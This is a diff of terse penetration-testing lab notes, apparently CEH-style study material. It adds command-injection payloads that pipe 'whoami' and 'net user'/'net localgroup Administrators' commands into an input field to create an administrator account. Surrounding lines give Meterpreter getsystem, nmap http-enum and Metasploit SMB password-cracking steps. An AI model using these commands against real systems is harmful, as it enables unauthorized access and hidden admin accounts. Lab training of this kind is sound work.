@@ -151,6 +151,9 @@ type getuid, getsystem -t 1, then again type getuid now get it ntauthority login
 HTTP Website enumuration 
 nmap -sV --script=http-enum [target domain or IP address] (here, the target website is www.certifiedhacker.com) and press Enter
 
+Command Injection
+Low Security
+| whoami (find win/linux which os running), | net user , | net user Test /add, | net user Test /delete, net localgroup Administrators Test /Add, | net user Test. Test 
 
 SMB Password Cracking
 msfconsole -q, use auxiliary/scanner/smb/smb_login, set PAS_FILE /home/parrot/password.txt, set RHOSTS 192.168.1.20, set SMBUser administrator, run 
